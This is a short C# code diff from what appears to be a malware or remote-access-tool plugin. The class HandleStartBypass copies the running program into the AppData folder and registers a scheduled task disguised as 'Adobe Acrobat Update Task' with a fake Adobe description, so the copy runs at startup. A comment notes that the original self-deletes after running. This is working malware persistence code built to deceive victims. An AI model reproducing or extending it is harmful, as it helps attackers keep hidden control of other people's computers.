@@ -13,10 +13,13 @@ namespace Plugin.Handler
 {
     class HandleStartBypass
     {
-        public static void AddStartUp(string filename)
+        public static void AddStartUp()
         {
-            try {
-                File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), filename), true);
+            try
+            {
+                Process processes = Process.GetCurrentProcess();
+                string name = processes.ProcessName + ".exe";
+                File.Copy(Process.GetCurrentProcess().MainModule.FileName, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name), true);
                 TaskService ts = new TaskService();
                 TaskDefinition td = ts.NewTask();
                 td.RegistrationInfo.Description = "This task keeps your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes";
@@ -29,7 +32,7 @@ namespace Plugin.Handler
                 td.Settings.RunOnlyIfNetworkAvailable = true;
                 td.Settings.RunOnlyIfIdle = false;
                 td.Settings.DisallowStartIfOnBatteries = false;
-                td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), filename), "", null));
+                td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name), "", null));
                 ts.RootFolder.RegisterTaskDefinition(@"Adobe Acrobat Update Task", td);
 
                 //运行后自杀
@@ -41,7 +44,7 @@ namespace Plugin.Handler
             {
                 Packet.Error(ex.Message);
             }
-            
-        }        
+
+        }
     }
 }
